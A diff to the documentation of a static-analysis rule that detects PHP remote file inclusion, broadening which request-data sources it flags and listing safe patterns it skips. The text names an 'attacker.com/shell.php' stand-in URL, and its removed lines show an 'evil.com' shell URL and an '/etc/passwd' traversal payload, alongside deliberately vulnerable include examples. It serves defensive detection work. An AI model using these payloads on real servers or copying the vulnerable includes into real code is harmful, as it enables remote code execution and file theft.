@@ -1,11 +1,11 @@
 ---
 title: "VNX-98 – PHP Remote File Inclusion"
-description: "Detect PHP include/require statements that use user-controlled superglobal variables as the file path, enabling attackers to load and execute arbitrary remote code."
+description: "PHP include/require statements whose path carries request data (superglobals, php://input, filter_input, $request->input), inline or through a variable, with no basename(), cast or allowlist check."
 ---
 
 ## Overview
 
-This rule flags PHP `include`, `include_once`, `require`, and `require_once` statements that directly use superglobal values (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`) as the file path argument. PHP Remote File Inclusion (RFI) allows an attacker to supply a URL (e.g. `http://attacker.com/shell.php`) as the file path, causing the server to fetch and execute arbitrary PHP code from that remote URL — if `allow_url_include` is enabled. Even when RFI is not possible, the same pattern enables Local File Inclusion (LFI), which allows reading sensitive files and, in some configurations, code execution via log-file poisoning or PHP filter chains. This maps to [CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')](https://cwe.mitre.org/data/definitions/98.html).
+This rule flags PHP `include`, `include_once`, `require`, and `require_once` statements whose path carries request data (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, `$_FILES`, `php://input`, `filter_input()`, Laravel/Symfony `$request->input()`), inline, interpolated, or through a variable assigned from it in the 25 lines above. A path passed through `basename()` or an integer cast, or checked against an allowlist (`in_array`, `array_key_exists`, `preg_match`) before the include, is not reported. PHP Remote File Inclusion (RFI) allows an attacker to supply a URL (e.g. `http://attacker.com/shell.php`) as the file path, causing the server to fetch and execute arbitrary PHP code from that remote URL — if `allow_url_include` is enabled. Even when RFI is not possible, the same pattern enables Local File Inclusion (LFI), which allows reading sensitive files and, in some configurations, code execution via log-file poisoning or PHP filter chains. This maps to [CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')](https://cwe.mitre.org/data/definitions/98.html).
 
 **Severity:** Critical | **CWE:** [CWE-98 – PHP Remote File Inclusion](https://cwe.mitre.org/data/definitions/98.html)
 
@@ -17,26 +17,22 @@ PHP RFI was one of the most prevalent attack classes in the mid-2000s and remain
 
 ```php
 <?php
-// FLAGGED: direct superglobal in include
-$page = $_GET['page'];
-include($page);                      // attacker: ?page=http://evil.com/shell.php
+// FLAGGED: request data inline or interpolated in the include path
+include($_GET['module'] . '.php');
+require $_POST['lib'];
+include "pages/{$_GET['p']}.php";
 
-// FLAGGED: inline superglobal
-include($_GET['module'] . '.php');   // attacker: ?module=../../../etc/passwd%00
+// FLAGGED: through a variable, even after a str_replace() blacklist
+$file = $_GET['file'];
+$file = str_replace(array("../", "..\\"), "", $file);
+include($file);
 
-// FLAGGED: require with POST data
-require($_POST['lib']);
-
-// FLAGGED: require_once with REQUEST
-require_once($_REQUEST['template']);
+// FLAGGED: Laravel request accessor
+$theme = $request->input('theme');
+include resource_path('themes/' . $theme . '/layout.php');
 ```
 
-```php
-<?php
-// FLAGGED (warning): variable include — may be user-tainted
-$module = getModule();  // trace: does getModule() use $_GET?
-include($module);
-```
+Not flagged: `require_once "lang/" . basename($_GET['lang']) . ".php";`, a `$page` checked with `in_array($page, $allowed, true)` before the include, `require_once __DIR__ . '/vendor/autoload.php';`, and variables not read from the request in the same file.
 
 ## Remediation
 
